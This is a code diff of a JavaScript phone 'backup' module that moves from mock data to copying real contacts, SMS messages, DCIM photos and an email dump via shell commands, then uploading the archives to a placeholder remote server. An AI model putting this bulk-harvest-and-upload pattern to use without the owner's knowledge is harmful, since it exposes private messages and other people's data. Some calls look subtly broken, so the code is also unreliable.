@@ -1,76 +1,146 @@
+const fs = require('fs');
+const path = require('path');
+const archiver = require('archiver');
+const { exec } = require('child_process');
+
 class BackupModule {
-    constructor(deviceId) {
-        this.deviceId = deviceId;
-        this.serverUrl = 'http://localhost:4000/upload';
-    }
+  constructor(deviceId) {
+    this.deviceId = deviceId;
+    this.uploadUrl = 'https://your-server.com/upload';
+  }
 
-    async backupContacts() {
-        try {
-            console.log('جاري نسخ جهات الاتصال...');
-            // محاكاة الحصول على جهات الاتصال
-            const contacts = [
-                {name: 'محمد أحمد', phone: '0555555555'},
-                {name: 'علي حسن', phone: '0666666666'}
-            ];
-            
-            const data = JSON.stringify(contacts, null, 2);
-            const filename = `contacts-${Date.now()}.json`;
-            
-            await this.uploadFile(filename, data);
-            return true;
-        } catch (error) {
-            console.error('فشل في نسخ جهات الاتصال:', error);
-            return false;
-        }
+  async backupContacts() {
+    try {
+      const outputPath = this.getTempPath('contacts.zip');
+      await this.createZipFromQuery(
+        'content://com.android.contacts/data',
+        outputPath
+      );
+      this.uploadFile(outputPath);
+      return true;
+    } catch (error) {
+      console.error('فشل في نسخ جهات الاتصال:', error);
+      return false;
     }
+  }
 
-    async backupSMS() {
-        try {
-            console.log('جاري نسخ الرسائل النصية...');
-            // محاكاة الحصول على الرسائل
-            const messages = [
-                {sender: '0555555555', message: 'مرحباً، كيف حالك؟', date: '2023-10-01'},
-                {sender: '0666666666', message: 'هل نلتقي غداً؟', date: '2023-10-02'}
-            ];
-            
-            const data = JSON.stringify(messages, null, 2);
-            const filename = `sms-${Date.now()}.json`;
-            
-            await this.uploadFile(filename, data);
-            return true;
-        } catch (error) {
-            console.error('فشل في نسخ الرسائل النصية:', error);
-            return false;
-        }
+  async backupSMS() {
+    try {
+      const outputPath = this.getTempPath('sms.zip');
+      await this.createZipFromQuery(
+        'content://sms',
+        outputPath
+      );
+      this.uploadFile(outputPath);
+      return true;
+    } catch (error) {
+      console.error('فشل في نسخ الرسائل:', error);
+      return false;
     }
+  }
 
-    async uploadFile(filename, content) {
-        try {
-            const base64Data = btoa(unescape(encodeURIComponent(content)));
-            const response = await fetch(this.serverUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    deviceId: this.deviceId,
-                    filename: filename,
-                    data: base64Data
-                })
-            });
-            
-            if (!response.ok) {
-                throw new Error('فشل في رفع الملف');
-            }
-            
-            const result = await response.json();
-            console.log('تم رفع الملف بنجاح:', result.url);
-            return result.url;
-        } catch (error) {
-            console.error('خطأ في رفع الملف:', error);
-            throw error;
-        }
+  async backupMedia() {
+    try {
+      const outputPath = this.getTempPath('media.zip');
+      const mediaDir = '/sdcard/DCIM';
+      
+      await this.zipDirectory(mediaDir, outputPath);
+      this.uploadFile(outputPath);
+      return true;
+    } catch (error) {
+      console.error('فشل في نسخ الوسائط:', error);
+      return false;
     }
+  }
+
+  async backupEmails() {
+    try {
+      const outputPath = this.getTempPath('emails.zip');
+      const emailData = await this.executeCommand('dumpsys email');
+      
+      fs.writeFileSync('/sdcard/emails.txt', emailData);
+      await this.zipFiles(['/sdcard/emails.txt'], outputPath);
+      
+      this.uploadFile(outputPath);
+      return true;
+    } catch (error) {
+      console.error('فشل في نسخ الإيميلات:', error);
+      return false;
+    }
+  }
+
+  async createZipFromQuery(uri, outputPath) {
+    const data = await this.executeCommand(`content query --uri "${uri}"`);
+    fs.writeFileSync('/sdcard/temp_data.txt', data);
+    await this.zipFiles(['/sdcard/temp_data.txt'], outputPath);
+    fs.unlinkSync('/sdcard/temp_data.txt');
+  }
+
+  async zipDirectory(sourceDir, outputPath) {
+    const output = fs.createWriteStream(outputPath);
+    const archive = archiver('zip');
+    
+    return new Promise((resolve, reject) => {
+      output.on('close', resolve);
+      archive.on('error', reject);
+      
+      archive.pipe(output);
+      archive.directory(sourceDir, false);
+      archive.finalize();
+    });
+  }
+
+  async zipFiles(files, outputPath) {
+    const output = fs.createWriteStream(outputPath);
+    const archive = archiver('zip');
+    
+    return new Promise((resolve, reject) => {
+      output.on('close', resolve);
+      archive.on('error', reject);
+      
+      archive.pipe(output);
+      files.forEach(file => {
+        archive.file(file, { name: path.basename(file) });
+      });
+      archive.finalize();
+    });
+  }
+
+  async uploadFile(filePath) {
+    const formData = new FormData();
+    formData.append('deviceId', this.deviceId);
+    formData.append('file', fs.createReadStream(filePath));
+    
+    const response = await fetch(this.uploadUrl, {
+      method: 'POST',
+      body: formData
+    });
+    
+    if (response.ok) {
+      console.log('تم رفع الملف بنجاح:', filePath);
+      fs.unlinkSync(filePath);
+      return response.json();
+    } else {
+      throw new Error('فشل في رفع الملف');
+    }
+  }
+
+  getTempPath(filename) {
+    const tempDir = '/sdcard/temp';
+    if (!fs.existsSync(tempDir)) {
+      fs.mkdirSync(tempDir);
+    }
+    return path.join(tempDir, filename);
+  }
+
+  executeCommand(cmd) {
+    return new Promise((resolve, reject) => {
+      exec(cmd, (error, stdout, stderr) => {
+        if (error) reject(error);
+        else resolve(stdout);
+      });
+    });
+  }
 }
 
 module.exports = BackupModule;
